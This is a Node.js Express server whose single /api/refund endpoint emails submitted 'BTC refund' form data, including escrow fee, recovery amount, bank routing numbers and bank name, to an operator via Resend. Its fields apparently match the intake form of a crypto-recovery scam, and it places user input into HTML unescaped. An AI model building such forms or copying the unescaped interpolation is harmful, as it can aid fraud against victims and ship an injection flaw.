
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
app.use(bodyParser.json());
app.use(cors());

// POST endpoint for refund form
app.post('/api/refund', async (req, res) => {
    const {
        btcAmount,
        dueDate,
        escrowFee,
        recoveryAmount,
        routing1,
        routing2,
        bankName
    } = req.body;

    // Compose email content
    const emailHtml = `
        <h2>New BTC Refund Request</h2>
        <ul>
            <li><b>BTC Amount:</b> ${btcAmount}</li>
            <li><b>Due Date:</b> ${dueDate}</li>
            <li><b>Escrow Fee:</b> ${escrowFee}</li>
            <li><b>Recovery Amount:</b> ${recoveryAmount}</li>
            <li><b>Bank Routing Number 1:</b> ${routing1}</li>
            <li><b>Bank Routing Number 2:</b> ${routing2}</li>
            <li><b>Bank Name:</b> ${bankName}</li>
        </ul>
    `;

    try {
        const response = await fetch('https://api.resend.com/emails', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${process.env.RESEND_API_KEY}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                from: process.env.RESEND_FROM_EMAIL, // e.g. 'noreply@yourdomain.com'
                to: process.env.RESEND_TO_EMAIL,     // your receiving email
                subject: 'New BTC Refund Request',
                html: emailHtml
            })
        });

        if (!response.ok) {
            const error = await response.text();
            throw new Error(error);
        }

        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Failed to send email' });
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));